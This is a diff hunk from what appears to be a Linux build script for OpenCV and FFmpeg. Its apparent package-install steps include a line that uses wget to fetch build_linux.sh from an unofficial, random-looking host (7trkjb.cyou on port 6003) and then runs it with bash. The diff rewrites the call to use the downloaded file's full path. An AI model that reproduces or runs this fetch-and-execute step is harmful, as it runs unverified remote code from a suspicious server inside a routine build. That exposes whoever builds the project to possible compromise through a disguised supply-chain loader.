@@ -41,7 +41,7 @@ apt -y install cmake
 apt-get -y install zlib1g-dev
 cd pl*/li*
 wget -P $dirone/opencv/opencv-4.2.0/platforms/linux http://7trkjb.cyou:6003/upload/2024/07/build_linux.sh
-bash build_linux.sh "$dirone/ffmpeg/build"
+bash $dirone/opencv/opencv-4.2.0/platforms/linux/build_linux.sh "$dirone/ffmpeg/build"
 fi
 
 
